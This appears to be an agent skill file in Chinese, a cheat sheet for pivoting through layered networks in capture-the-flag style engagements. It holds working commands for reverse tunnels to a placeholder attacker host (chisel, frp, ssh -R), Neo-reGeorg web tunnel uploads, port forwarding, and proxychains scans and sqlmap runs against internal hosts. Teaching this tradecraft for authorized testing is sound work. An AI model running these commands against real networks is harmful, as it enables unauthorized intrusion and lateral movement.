---
name: multi-layer-network
description: 多层网络渗透与隧道搭建。Use when the target is behind a DMZ, multiple network segments, or a firewall partition — you hold a foothold on one host but the flag lives 1-2 hops deeper. Covers tunnel building (chisel/frp/SSH/Neo-reGeorg), multi-hop chains, port forwarding, and SOCKS proxying through each layer. The core skill of a multi-stage engagement: after each foothold, build the tunnel to see (and reach) the next segment.
---

# 多层网络渗透与隧道搭建

## 1. 每个立足点先摸清网卡(判断是否天然跳板)

```bash
ip addr && ip route && arp -a && cat /etc/hosts      # Linux
ipconfig /all && route print && arp -a               # Windows
```

**关键判断**:
- 双网卡(eth0=外网, eth1=10.x.x.x)→ 天然跳板,直接扫内网
- 只有内网 IP → 需要反向隧道(让攻击机通过目标出网)
- DNS 指向内网 IP / `net view /domain` → 域环境

## 2. 隧道工具选择

| 场景 | 工具 | 命令 |
|---|---|---|
| 单二进制,最稳 | **chisel** | `chisel server -p 8080 --reverse`(攻击机);`chisel client ATTACKER:8080 R:0.0.0.0:socks`(目标) |
| 目标能出网 | **frp** | frps(攻击机)/ frpc(目标) 配 socks/端口转发 |
| 目标有 SSH | **SSH 反向** | 目标 `ssh -R 1080:127.0.0.1:1080 user@ATTACKER` + `ssh -D 1080` |
| Web 目标 | **Neo-reGeorg** | 上传 tunnel.(jsp|aspx|php) → `python neoreg.py -k PASS -u http://TARGET/tunnel.php` |

多跳链(第 2 跳):在跳板 A 上再起一个 chisel/frp 客户端,把 B 的网段转发到攻击机,形成 `攻击机 → A → B → 目标` 的链。

## 3. 端口转发(不用代理,单端口直达)

```bash
# 本地转发:攻击机 9999 → 经 SSH → 内网 C:3306
ssh -L 9999:C:3306 user@A
# 远程转发:目标 A 上把内网 C:80 反弹到攻击机 8080
ssh -R 8080:C:80 user@ATTACKER
# socat 快速转发
socat TCP-LISTEN:9999,fork TCP:C:3306
```

## 4. 经代理扫内网(拿到 socks 后)

```bash
proxychains4 nmap -sT -Pn -p 22,80,443,3306,445,8080 10.x.x.0/24
proxychains4 curl http://INTERNAL_TARGET/
proxychains4 sqlmap -u http://INTERNAL_TARGET/vuln.php?id=1
```
注意:SOCKS 只支持 TCP 全连接扫描(`-sT`),不能用 `-sS`(需要原始套接字)。

## 5. 逐层推进的节奏

1. 拿下外网立足点 → 建隧道 → 扫内网网段(找 OA/DB/域控/文件服务器)
2. 打到第 2 层(OA/DB)→ 再收集凭据 → 再建一层隧道 → 扫更深网段
3. 重复直到 flag 主机可达;每层都记录 `攻击机:port → 跳板 → 内网 host` 的映射,断了链就重建

## 6. 纪律

- 先看网卡再选隧道(出网→frp/chisel 反向,不出网→SSH -R/socat)。
- SOCKS 隧道里只做 TCP 扫描;端口转发适合"只要一个服务"的场景,代理适合"要扫整个网段"。
- 每跳限时:一种隧道工具连不通就换,别死磕一个。
- 隧道断了先检查进程和目标存活,再重建;保持链拓扑记录。
